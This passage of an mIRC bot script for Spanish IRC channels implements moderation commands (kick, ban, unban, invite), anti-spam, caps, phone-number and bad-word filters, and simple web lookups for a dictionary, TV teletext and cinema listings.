          else { unset %UTRADUCTOR- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando UTRADUCTOR desactivado. }
        }
      }
      if ($strip($2) == UDIC) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 UDIC ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%UDIC- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UDIC2 ya est· activado. }
          else { set %UDIC- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando UDIC activado. Todos los usuarios de este canal podran utilizar el comando DIC. }
        }
        if ($strip($3) == OFF) {
          if (!%UDIC- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UDIC2 no est· activado. }
          else { unset %UDIC- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando UDIC desactivado. }
        }
      }
      if ($strip($2) == VIST) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 VIST ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%VIST- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 VIST2 ya est· activado. }
          else { set %VIST- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando VIST activado. }
        }
        if ($strip($3) == OFF) {
          if (!%VIST- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 VIST2 no esta activado. }
          else { unset %VIST- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando VIST desactivado. }
        }
      }
      if ($strip($2) == ANTIREPES) {
        if ($strip($3) != ON) && ($strip($3) != OFF) && ($strip($3) != AVISOS) && ($strip($3) != MSG.AVISO) && ($strip($3) != MSG.KICK) && ($strip($3) != ESTADO) { msg %msgdestino 2Error2: Especifique el estado,2 ANTIREPES ON\OFF\AVISOS\MSG.AVISO\MSG.KICK\ESTADO | halt }
        if ($strip($3) == ON) {
          if (%ANTIREPES- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: La protecciÛn2 ANTIREPES2 ya est· activada. }
          else { set %ANTIREPES- $+ %canaldestinoMSG s | msg %msgdestino 2ProtecciÛn ANTIREPES2 activada. }
        }
        if ($strip($3) == OFF) {
          if (!%ANTIREPES- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: La protecciÛn2 ANTIREPES2 no esta activada. }
          else { unset %ANTIREPES- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn ANTIREPES2 desactivada. }
        }
        if ($strip($3) == ESTADO) {
          msg %msgdestino 2Estado de ANTIREPES Mensaje AVISOS: $iif(%MSG.AVISO.ANTIREPES. [ $+ [ %canaldestinoMSG ] ] != $null,%MSG.AVISO.ANTIREPES. [ $+ [ %canaldestinoMSG ] ],°No repeticiones!) Mensaje de KICKs: $iif(%MSG.KICK.ANTIREPES. [ $+ [ %canaldestinoMSG ] ] != $null,%MSG.KICK.ANTIREPES. [ $+ [ %canaldestinoMSG ] ],Las repeticiones estan prohibidas)
        }
        if ($strip($3) == AVISOS) {
          if ($strip($4) isnum) && (+ !isin $4) && (- !isin $4) { set %AVISOS.ANTIREPES. [ $+ [ %canaldestinoMSG ] ] $strip($4) | msg %msgdestino 2ANTIREPES2: N∫ de avisos fijado en12 $strip($4) $+ . }
          else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTIREPES AVISOS <NUMERO> }
        }
        if ($strip($3) == MSG.AVISO) {
          if ($4 == $null) { msg %msgdestino 2AntiRepes2 Se ha restablecido el mensaje de aviso por defecto. | unset %MSG.AVISO.ANTIREPES. [ $+ [ %canaldestinoMSG ] ] }
          else { set %MSG.AVISO.ANTIREPES. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2AntiRepes2 Se ha cambiado el mensaje de aviso por: $4- }
        }
        if ($strip($3) == MSG.KICK) {
          if ($4 == $null) { msg %msgdestino 2AntiRepes2 Se ha restablecido el mensaje del kick por defecto. | unset %MSG.KICK.ANTIREPES. [ $+ [ %canaldestinoMSG ] ] }
          else { set %MSG.KICK.ANTIREPES. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2AntiRepes2 Se ha cambiado el mensaje del kick por: $4- }
        }
      }
      if ($strip($2) == SMEN) { if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el mensaje de saludo. } | else { set %rvhe- [ $+ [ %canaldestinoMSG ] ] $3- | msg %msgdestino 2Ok2 Mensaje de saludo cambiado correctamente. } }
      if ($strip($2) == ASALUDO) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 ASALUDO ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%AHE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 ASALUDO2 ya est· activado. }
          else { if (!%rvhe- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Antes de activar el auto saludo debes configurar el mensaje de bienvenid@ con: SMEN 2MENSAJE2. | halt } | set %AHE- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando ASALUDO activado. }
        }
        if ($strip($3) == OFF) {
          if (!%AHE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 ASALUDO2 no esta activado. }
          else { unset %AHE- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando ASALUDO desactivado. }
        }
      }
      if ($strip($2) == YOUTUBE.AUTOLINK) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 YOUTUBE.AUTOLINK ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%YOUTUBE.autolink- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 YOUTUBE.AUTOLINK2 ya est· activado. }
          else { set %YOUTUBE.autolink- $+ %canaldestinoMSG s | msg %msgdestino 2Comando YOUTUBE.AUTOLINK2 Activado, se reconoceran los enlaces de YouTube en los textos. }
        }
        if ($strip($3) == OFF) {
          if (!%YOUTUBE.autolink- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 YOUTUBE.AUTOLINK2 no esta activado. }
          else { unset %YOUTUBE.autolink- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Comando YOUTUBE.AUTOLINK2 desactivado. }
        }
      }
      if ($strip($2) == DIC) && ($3) { sockclose dic. $+ $chr(3) $+ %msgdestino $+ $chr(2) $+ $strip($3) | sockopen dic. $+ $chr(3) $+ %msgdestino $+ $chr(2) $+ $strip($3) buscon.rae.es 80 }
      if ($strip($2) == GOOGLE) && ($3) { google.exalink %msgdestino $nick $replace($strip($3-),+,% $+ 2B,$chr(32),+) }
      if ($strip($2) == TRADUCTOR) && ($3) { traductor.on %msgdestino $nick $replace($strip($3-),+,% $+ 2B,$chr(32),+) }
      if ($strip($2) == FECHA) { msg %msgdestino 2Fecha actual12 $date $+ 2 }
      if ($strip($2) == HORA) { msg %msgdestino 2Hora actual12 $time $+ 2 }
      if ($strip($2) == TELETEXTO) {
        if (!$strip($3)) { msg %msgdestino 2Sintaxis: TELETEXTO [Cadenas:12 TVE1 2/12 TVE2 2/12 LASEXTA 2/12 ETB1 2/12 ETB2 2/12 TV3 2/12 TVG 2/12 Antena3 2/12 Cuatro 2/12 Tele5 2/12 Canal2 2/12 Canal9 2/12 Canal33 2/12 CanalSur 2/12 CastillaLaMancha 2/12 Punt2 2/12 TVCanaria 2/12 TeleMadrid2] | halt }
        if ($strip($3) == LASEXTA) { %TELEX = La+Sexta&tv=n }
        if ($strip($3) == ETB2) { %TELEX = ETB+2&tv=a }
        if ($strip($3) == ETB1) { %TELEX = ETB+1&tv=a }
        if ($strip($3) == TVE1) { %TELEX = TVE1&tv=n }
        if ($strip($3) == TVE2) { %TELEX = TVE2&tv=n }
        if ($strip($3) == Antena3) { %TELEX = Antena+3&tv=n }
        if ($strip($3) == Cuatro) { %TELEX = Cuatro&tv=n }
        if ($strip($3) == Tele5) { %TELEX = Tele+5&tv=n }
        if ($strip($3) == Canal2) { %TELEX = Canal+2&tv=a }
        if ($strip($3) == Canal9) { %TELEX = Canal+9&tv=a }
        if ($strip($3) == Canal33) { %TELEX = Canal+33&tv=a }
        if ($strip($3) == CanalSur) { %TELEX = Canal+Sur&tv=a }
        if ($strip($3) == CastillaLaMancha) { %TELEX = Castilla-La+Mancha&tv=a }
        if ($strip($3) == TeleMadrid) { %TELEX = TVAM&tv=a }
        if ($strip($3) == TV3) { %TELEX = TV3&tv=a }
        if ($strip($3) == TVG) { %TELEX = TVG&tv=a }
        if ($strip($3) == TVCanaria) { %TELEX = TV+Canaria&tv=a }
        if ($strip($3) == Punt2) { %TELEX = Punt+2&tv=a }
        if (%TELEX) { msg %msgdestino 2TELETEXTO Para2 $upper($strip($2)) $+ :12 http://www.teletexto.com/teletexto.asp?programacion= $+ %TELEX $+ &tv=n }
        else { msg %msgdestino 2Sintaxis TELETEXTO [Cadenas:12 TVE1 2/12 TVE2 2/12 LASEXTA 2/12 ETB1 2/12 ETB2 2/12 TV3 2/12 TVG 2/12 Antena3 2/12 Cuatro 2/12 Tele5 2/12 Canal2 2/12 Canal9 2/12 Canal33 2/12 CanalSur 2/12 CastillaLaMancha 2/12 Punt2 2/12 TVCanaria 2/12 TeleMadrid2] }
      }
      if ($strip($2) == UNBAN) && ($strip($3)) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        mode %canaldestinoMSG +b | if ($ibl(%canaldestinoMSG,0) == 0) { msg %msgdestino 2Error2: No se encontraron BANS. | halt }
        set %ibl 1
        while ($ibl(%canaldestinoMSG,%ibl)) {
          if ($ibl(%canaldestinoMSG,%ibl) == $strip($3)) { mode %canaldestinoMSG -b $ibl(%canaldestinoMSG,%ibl) | halt }
          if ($ibl(%canaldestinoMSG,%ibl) == $strip($3) $+ !*@*) { mode %canaldestinoMSG -b $ibl(%canaldestinoMSG,%ibl) | halt }
          inc %ibl
        }
      }
      if ($strip($2) == UNBANS) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        mode %canaldestinoMSG +b | msg %msgdestino 2Limpiando BAN LIST2.. | if ($ibl(%canaldestinoMSG,0) == 0) { msg %msgdestino 2Error2: No se encontraron BANS. | halt }
        unset %ibl | :ub | if (%ibl > $ibl(%canaldestinoMSG,0)) { unset %ibl | halt } | inc %ibl
        if ($ibl(%canaldestinoMSG,%ibl) != $null) { mode %canaldestinoMSG -bbbbb $ibl(%canaldestinoMSG,%ibl) $ibl(%canaldestinoMSG,$calc(%ibl + 1)) $ibl(%canaldestinoMSG,$calc(%ibl + 2)) $ibl(%canaldestinoMSG,$calc(%ibl + 3)) $ibl(%canaldestinoMSG,$calc(%ibl + 4)) | set %ibl $calc(%ibl + 4) } | goto ub
      }
      if ($strip($2) == K) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick. | halt }
        if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no est· en el canal. | halt }
        kick %canaldestinoMSG $strip($3) $strip($4-)
      }
      if ($strip($2) == BK) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick. | halt }
        if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no est· en el canal. | halt }
        mode %canaldestinoMSG -o+bb $strip($3) $address($strip($3),2) $strip($3) | kick %canaldestinoMSG $strip($3) $strip($4-)
      }
      if ($strip($2) == KB) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick. | halt }
        if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no est· en el canal. | halt }
        kick %canaldestinoMSG $strip($3) $strip($4-) | mode %canaldestinoMSG -o+bb $strip($3) $address($strip($3),2) $strip($3)
      }
      if ($strip($2) == BI) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick. | halt }
        if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no est· en el canal. | halt }
        mode %canaldestinoMSG -o+b $strip($3) $replace($address($strip($3),0),a,?,b,?,c,?,d,?,i,?,z,?,e,?,h,?)
      }
      if ($strip($2) == B) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick. | halt }
        if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no est· en el canal. | halt }
        mode %canaldestinoMSG -o+bb $strip($3) $address($strip($3),2) $strip($3)
      }
      if ($strip($2) == BIK) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick. | halt }
        if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no est· en el canal. | halt }
        mode %canaldestinoMSG -o+b $strip($3) $replace($address($strip($3),0),a,?,b,?,c,?,d,?,i,?,z,?,e,?,h,?) | kick %canaldestinoMSG $strip($3) $4-
      }
      if ($strip($2) == MODE) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique los modos. | halt } | mode %canaldestinoMSG $strip($3-)
      }
      if ($strip($2) == RVMSG) { if (!%rvmsg- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: No existe ningun mensaje de aviso. } | else { msg %msgdestino 2Mensaje de aviso: %rvmsg- [ $+ [ %canaldestinoMSG ] ] } }
      if ($strip($2) == RVSET) { if (!$3) { msg %msgdestino 2Error2: Especifique el mensaje de aviso. } | else { set %rvmsg- [ $+ [ %canaldestinoMSG ] ] $3- | msg %msgdestino 2OK2 Mensaje de aviso cambiado correctamente. } }
      if ($strip($2) == SWEB) { if (!$3) { msg %msgdestino 2Error2: Especifique la Web. } | else { set %WEB- [ $+ [ %canaldestinoMSG ] ] $3- | msg %msgdestino 2OK2 Pagina web cambiada correctamente. } }
      if ($strip($2) == INV) {
        if (!$strip($3)) { msg %msgdestino 2Error2: Sintaxis INV 12Nicks | halt }
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | .msg chan op %canaldestinoMSG $me | halt }
        if ($strip($3)) && ($strip($3) !ison %canaldestinoMSG) { .invite $strip($3) %canaldestinoMSG } | if ($strip($4)) && ($strip($4) !ison %canaldestinoMSG) { .invite $strip($4) %canaldestinoMSG }
        if ($strip($5)) && ($strip($5) !ison %canaldestinoMSG) { .invite $strip($5) %canaldestinoMSG } | if ($strip($6)) && ($strip($6) !ison %canaldestinoMSG) { .invite $strip($6) %canaldestinoMSG }
        if ($strip($7)) && ($strip($7) !ison %canaldestinoMSG) { .invite $strip($7) %canaldestinoMSG } | if ($strip($8)) && ($strip($8) !ison %canaldestinoMSG) { .invite $strip($8) %canaldestinoMSG }
        if ($strip($9)) && ($strip($9) !ison %canaldestinoMSG) { .invite $strip($9) %canaldestinoMSG } | if ($strip($10)) && ($strip($10) !ison %canaldestinoMSG) { .invite $strip($10) %canaldestinoMSG }
        if ($strip($11)) && ($strip($11) !ison %canaldestinoMSG) { .invite $strip($11) %canaldestinoMSG } | if ($strip($12)) && ($strip($12) !ison %canaldestinoMSG) { .invite $strip($12) %canaldestinoMSG }
        if ($strip($13)) && ($strip($13) !ison %canaldestinoMSG) { .invite $strip($13) %canaldestinoMSG } | if ($strip($14)) && ($strip($14) !ison %canaldestinoMSG) { .invite $strip($14) %canaldestinoMSG }
      }
      if ($strip($2) == ASCII) && ($strip($3) isnum) { msg %msgdestino 2R2esultado del ASCII12 $strip($3) 2CHR12 $chr($3) }
      if ($strip($2) == HOROSCOPO) { horoscopo %msgdestino $strip($3) }
    }
  }
}
Alias AntiTelefonos {
  %anti-telef.s = $remove($strip($1-),$chr(32),.,$chr(44),-,+,_,/,\) | %anti-telef.1 = 1
  while ($mid(%anti-telef.s,%anti-telef.1,1) != $null) {
    %anti-telef.2 = $mid(%anti-telef.s,%anti-telef.1,9)
    if ($left(%anti-telef.2,1) == 6) || ($left(%anti-telef.2,1) == 9) {
      if ($mid($mid(%anti-telef.s,%anti-telef.1,10),10,1) !isnum) || ($mid($mid(%anti-telef.s,%anti-telef.1,10),10,1) == $null) {
        if ($len(%anti-telef.2) == 9) && (%anti-telef.2 isnum) { return si }
    } }
    inc %anti-telef.1
} }
;conectar clon al irc-hispano
On *:sockopen:mb:{
  if ($sockerr == 0) {
    sockw NiCk %NICKB $+ - $+ $r(10000,99999)
    sockw user MB37 xxxx xxxx :MegaBOT v3.7 www.maincenter.es
  }
}
On *:sockread:mb:{
  sockread %mb.read
  set %mb.read $strip(%mb.read)
  if ($gettok(%mb.read,1,32) == PING) { sockw PONG $gettok(%mb.read,2,32) }
  if ($gettok(%mb.read,2,32) == 422) { sockw join #kellernet&rok }
}
alias sockw { if ($sock(mb).status == active) { sockwrite -nt mb $1- } }
;Codigo Cine estrenos
alias cine.estrenos { if ($1) { sockclose estrenos. $+ $1 | sockopen estrenos. $+ $1 www.elmulticine.com 80 } }
on *:SOCKOPEN:estrenos.*:{
  if ($sockerr == 0) {
    sockwrite -n $sockname GET /estrenos.php HTTP/1.1
    sockwrite -n $sockname Host: www.elmulticine.com
    sockwrite -n $sockname Connection: keep-alive
    sockwrite -n $sockname Cache-Control: max-age=0
    sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2
    sockwrite -n $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    sockwrite -n $sockname Accept-Encoding: gzip,deflate,sdch
    sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8
    sockwrite -n $sockname Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
    sockwrite -n $sockname $crlf
  }
  else { msg $gettok($sockname,2,46) 2Cine Estrenos2: Error al conectar. }
}
on *:SOCKREAD:estrenos.*:{
  sockread %estrenos
  if (%estrenos.fch) && (/peliculas_listado2.php?orden= isin %estrenos) && (/imagenes/carteles/ !isin %estrenos) && (<span class='titulo'> isin %estrenos) { set %estrenos.n1 %estrenos.n1 $+ $iif(%estrenos.n1,2 $+ $chr(44) $+ 12) $html(%estrenos) }
  if (<div class="rotuloazul" title="Estrenos de cine del isin %estrenos) && ($html(%estrenos)) { unset %estrenos.n1 | set %estrenos.fch $remove($ifmatch,Estrenos de cine del) }
  elseif (<div class="rotuloazul" title=" isin %estrenos) { msg $gettok($sockname,2,46) 2Cine Estrenos2: %estrenos.fch $+ 12 %estrenos.n1 $+ 2. | sockclose $sockname }
}
alias bans.exp.dbans {
  if (%BANS.EXP. [ $+ [ $1 ] ] isnum) && ($timer(ban.exp $+ $1 $+ .f) == $null) {
    unset %bans.exp.dbans.* %bans.exp.bnss
    %bans.exp.dbans = 1
    while ($ibl($1,%bans.exp.dbans)) {
      if ($ctime >= $calc($ibl($1,%bans.exp.dbans).ctime + $calc(%BANS.EXP. [ $+ [ $1 ] ] * 60))) { set %bans.exp.bnss %bans.exp.bnss $ibl($1,%bans.exp.dbans) }
      inc %bans.exp.dbans
    }
    unset %bans.exp.dbans2
    %bans.exp.dbans = 1
    while ($gettok(%bans.exp.bnss,%bans.exp.dbans,32)) {
      inc %bans.exp.dbans2 4
      .timerban.exp $+ $1 $+ . $+ %bans.exp.dbans2 1 %bans.exp.dbans2 mode $1 -bbbbbb $gettok(%bans.exp.bnss,%bans.exp.dbans,32) $gettok(%bans.exp.bnss,$calc(%bans.exp.dbans + 1),32) $gettok(%bans.exp.bnss,$calc(%bans.exp.dbans + 2),32) $gettok(%bans.exp.bnss,$calc(%bans.exp.dbans + 3),32) $gettok(%bans.exp.bnss,$calc(%bans.exp.dbans + 4),32) $gettok(%bans.exp.bnss,$calc(%bans.exp.dbans + 5),32)
      .timerban.exp $+ $1 $+ .f 1 $calc(%bans.exp.dbans2 + 5) bans.exp
      inc %bans.exp.dbans 6
    }
  } 
}
alias bans.exp {
  if (%BANS.EXP. [ $+ [ $hget(canales,1).item ] ]) && ($me isop $hget(canales,1).item) { bans.exp.dbans $hget(canales,1).item }
  if (%BANS.EXP. [ $+ [ $hget(canales,2).item ] ]) && ($me isop $hget(canales,2).item) { bans.exp.dbans $hget(canales,2).item }
  if (%BANS.EXP. [ $+ [ $hget(canales,3).item ] ]) && ($me isop $hget(canales,3).item) { bans.exp.dbans $hget(canales,3).item }
  if (%BANS.EXP. [ $+ [ $hget(canales,4).item ] ]) && ($me isop $hget(canales,4).item) { bans.exp.dbans $hget(canales,4).item }
  if (%BANS.EXP. [ $+ [ $hget(canales,5).item ] ]) && ($me isop $hget(canales,5).item) { bans.exp.dbans $hget(canales,5).item }
  .timerbans.exp 1 30 bans.exp
}
alias auto.banner.ons {
  if (%AUTO.BANNER. [ $+ [ $hget(canales,1).item ] ]) { auto.banner.say $hget(canales,1).item %AUTO.BANNER. [ $+ [ $hget(canales,1).item ] ] }
  if (%AUTO.BANNER. [ $+ [ $hget(canales,2).item ] ]) { auto.banner.say $hget(canales,2).item %AUTO.BANNER. [ $+ [ $hget(canales,2).item ] ] }
  if (%AUTO.BANNER. [ $+ [ $hget(canales,3).item ] ]) { auto.banner.say $hget(canales,3).item %AUTO.BANNER. [ $+ [ $hget(canales,3).item ] ] }
  if (%AUTO.BANNER. [ $+ [ $hget(canales,4).item ] ]) { auto.banner.say $hget(canales,4).item %AUTO.BANNER. [ $+ [ $hget(canales,4).item ] ] }
  if (%AUTO.BANNER. [ $+ [ $hget(canales,5).item ] ]) { auto.banner.say $hget(canales,5).item %AUTO.BANNER. [ $+ [ $hget(canales,5).item ] ] }
}
alias auto.banner.say {
  ;canal segundos mensaje
  if (%AUTO.BANNER. [ $+ [ $1 ] ]) {
    if ($me ison $1) { .msg $1 $3- }
    .timerauto.banner.say- $+ $1 1 $2 auto.banner.say $1-
} }
alias nrlist {
  unset %nrlist* | set %nrlist5 $iif($3,$3,$1)
  if (-1 > $2) || ($2 > 499) { msg %nrlist5 2Error2: El nivel es entre el 12-12 y el 124992. | halt }
  %nrlist = 1
  while ($hget(r- $+ $1,%nrlist).item) {
    var %nrlist2 = $hget(r- $+ $1,$hget(r- $+ $1,%nrlist).item)
    if ($2 == $gettok(%nrlist2,1,32)) {
      inc %nrlist3 3
      inc %nrlist4 | if (%nrlist4 == 1) { msg %nrlist5 2Listando todos los usuarios $iif($3,de 12 $+ $1 $+ 2) con nivel $2 $+ 2: }
      .timernrlist- $+ $1 $+ - $+ $2 $+ - $+ %nrlist3 1 %nrlist3 msg %nrlist5 02 $+ %nrlist4 2Nivel12 $2 2Usuario:12 $hget(r- $+ $1,%nrlist).item 2PosiciÛn12 $iif($gettok(%nrlist2,2,32),$ifmatch,desconocida)
    }
    inc %nrlist
  }
  if (!%nrlist4) { msg %nrlist5 2Error2: No se encontro a nadie con nivel12 $2 $+ . }
}
alias antimayus {
  unset %antimayus2 %antimayus3
  %antimayus = 1
  var %antimayus.cad $remove($strip($1-),$chr(32))
  while ($mid(%antimayus.cad,%antimayus,1)) {
    if ($mid(%antimayus.cad,%antimayus,1) isupper) && ($mid(%antimayus.cad,%antimayus,1) isin qwertyuiopasdfghjklÒzxcvbnmÁ) { inc %antimayus2 }
    if ($mid(%antimayus.cad,%antimayus,1) isin qwertyuiopasdfghjklÒzxcvbnmÁ) { inc %antimayus3 }
    inc %antimayus
  }
  if (%antimayus3 >= 5) { return $round($calc($calc(%antimayus2 * 100) / %antimayus3),1) }
}
alias NICK.NCOM.exist {
  if (%NICK.NCOMCM. [ $+ [ $2 ] ]) && ($1 == anti) {
    if (CHAT isin $3-) || (CM isin $3-) { return false }
  }
  unset %NICK.NCOM.inc
  .fopen NICK.NCOM- $+ $2 %rHcN $+ NICK.NCOM- $+ $2 $+ .txt
  while (!$feof) && (!$ferr) {
    inc %NICK.NCOM.inc
    var %NICK.NCOM.read $fread(NICK.NCOM- $+ $2)
    if ($1 == anti) {
      if (%NICK.NCOM.read isin $3-) { .fclose NICK.NCOM- $+ $2 | return NCOM }
    }
    elseif (%NICK.NCOM.read == $3) { .fclose NICK.NCOM- $+ $2 | return %NICK.NCOM.inc }
  }
  .fclose NICK.NCOM- $+ $2
  return false
}
alias NICK.NCOM.add {
  if ($NICK.NCOM.exist(add,$1,$strip($2)) isnum) { return exist }
  else { write %rHcN $+ NICK.NCOM- $+ $1 $+ .txt $strip($2) | return ok }
}
alias NICK.NCOM.del { if ($NICK.NCOM.exist(del,$1,$2) isnum) { write -dl $+ $ifmatch %rHcN $+ NICK.NCOM- $+ $1 $+ .txt | return ok } }
alias shitlist.exist {
  unset %ShitList.inc
  .fopen ShitList- $+ $2 %rHcN $+ ShitList- $+ $2 $+ .txt
  while (!$feof) && (!$ferr) {
    inc %ShitList.inc
    var %ShitList.read $fread(ShitList- $+ $2)
    var %ShitList.read2 $gettok(%ShitList.read,1,32)
    var %ShitList.read3 $gettok(%ShitList.read,2-,32)
    if ($1 == shit) {
      if (%ShitList.read2 iswm $3) && (*!*@* iswm %ShitList.read2) { .fclose ShitList- $+ $2 | return %ShitList.read3 }
    }
    elseif (%ShitList.read2 iswm $3) { .fclose ShitList- $+ $2 | return %ShitList.inc }
  }
  .fclose ShitList- $+ $2
  if ($1 != shit) { return false }
}
alias ShitList.add {
  if ($ShitList.exist(add,$1,$strip($2)) isnum) { return exist }
  else { write %rHcN $+ ShitList- $+ $1 $+ .txt $strip($2) $3- | return ok }
}
alias ShitList.del { if ($ShitList.exist(del,$1,$2-) isnum) { write -dl $+ $ifmatch %rHcN $+ ShitList- $+ $1 $+ .txt | return ok } }
alias antispam.exist {
  unset %antispam.inc
  .fopen antispam- $+ $2 %rHcN $+ antispam- $+ $2 $+ .txt
  while (!$feof) && (!$ferr) {
    inc %antispam.inc
    var %antispam.read $fread(antispam- $+ $2)
    if ($1 == anti) {
      if (%antispam.read isin $3-) { .fclose antispam- $+ $2 | return SPAM }
    }
    elseif (%antispam.read == $3-) { .fclose antispam- $+ $2 | return %antispam.inc }
  }
  .fclose antispam- $+ $2
  return false
}
alias antispam.add {
  if ($antispam.exist(add,$1,$strip($2-)) isnum) { return exist }
  else { write %rHcN $+ antispam- $+ $1 $+ .txt $strip($2-) | return ok }
}
alias antispam.del { if ($antispam.exist(del,$1,$2-) isnum) { write -dl $+ $ifmatch %rHcN $+ antispam- $+ $1 $+ .txt | return ok } }
alias ANTIPALABROTAS.exist {
  unset %antipalabrotas.inc
  .fopen ANTIPALABROTAS- $+ $2 %rHcN $+ ANTIPALABROTAS- $+ $2 $+ .txt
  while (!$feof) && (!$ferr) {
    inc %antipalabrotas.inc
    var %ANTIPALABROTAS.read $fread(ANTIPALABROTAS- $+ $2)
    if ($1 == anti) {
      var %coincin.bsca.anti 1
      while ($gettok($3-,%coincin.bsca.anti,32) != $null) {
        if ($coincin.rok($gettok($3-,%coincin.bsca.anti,32),%ANTIPALABROTAS.read) == %ANTIPALABROTAS.read) { .fclose ANTIPALABROTAS- $+ $2 | return PALABROTA }
        inc %coincin.bsca.anti
      }
    }
